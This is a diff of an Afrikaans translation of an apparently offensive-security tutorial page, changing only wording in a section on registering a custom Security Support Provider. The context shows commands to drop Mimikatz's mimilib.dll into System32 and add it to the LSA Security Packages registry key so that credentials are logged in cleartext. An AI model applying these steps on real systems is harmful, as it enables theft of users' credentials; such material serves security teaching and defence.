@@ -11,14 +11,14 @@ Jy kan jou **eie SSP** skep om **in te vang** in **duidelike teks** die **akkred
 
 Jy kan die `mimilib.dll` binêre gebruik wat deur Mimikatz verskaf word. **Dit sal alle akkrediteerings in duidelike teks in 'n lêer log.**\
 Laat die dll val in `C:\Windows\System32\`\
-Kry 'n lys bestaande LSA Veiligheid Pakkette:
+Kry 'n lys van bestaande LSA Veiligheid Pakkette:
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-Voeg `mimilib.dll` by die Veiligheidsondersteuningsverskaffer lys (Veiligheidspakkette):
+Voeg `mimilib.dll` by die Veiligheidsondersteuningsverskafferlys (Veiligheidspakkette):
 ```powershell
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
